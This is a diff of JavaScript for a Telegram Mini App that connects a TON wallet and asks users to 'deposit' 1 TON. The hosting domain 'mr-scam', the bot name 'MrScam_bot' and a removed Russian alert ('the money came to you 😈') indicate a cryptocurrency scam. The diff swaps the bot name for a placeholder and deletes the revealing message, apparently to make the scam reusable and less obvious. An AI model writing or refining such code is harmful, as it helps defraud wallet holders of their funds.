@@ -1,15 +1,12 @@
 window.addEventListener('load', () => {
-  const tg = window.Telegram?.WebApp;
+  const tg = window.Telegram.WebApp;
 
-  if (!tg || !tg.initDataUnsafe) {
-    // В браузере — показываем блокировку с кнопкой
-    document.getElementById('blocked-screen').style.display = 'block';
-    document.getElementById('main-app').style.display = 'none';
+  if (!tg.initDataUnsafe || !tg.initData) {
+    // Не в Telegram — показываем блокировку
+    document.getElementById('app').style.display = 'none';
+    document.getElementById('blocked').style.display = 'block';
   } else {
-    // В Telegram — показываем приложение
-    document.getElementById('blocked-screen').style.display = 'none';
-    document.getElementById('main-app').style.display = 'block';
-
+    // В Telegram — запускаем приложение
     tg.expand();
     tg.ready();
 
@@ -25,7 +22,7 @@ window.addEventListener('load', () => {
       manifestUrl: 'https://mr-scam.vercel.app/tonconnect-manifest.json',
       buttonRootId: 'connect-container',
       actionsConfiguration: {
-        twaReturnUrl: 'https://t.me/MrScam_bot'
+        twaReturnUrl: 'https://t.me/ТВОЙ_БОТ_ЮЗЕРНЕЙМ'  // ← Замени на юзернейм бота!
       }
     });
 
@@ -56,7 +53,7 @@ window.addEventListener('load', () => {
 
       try {
         await tonConnectUI.sendTransaction(transaction);
-        alert('✅ 1 TON успешно внесено! Деньги пришли тебе 😈');
+        alert('✅ 1 TON успешно внесено!');
       } catch (e) {
         alert('❌ Ошибка или отменено');
       }
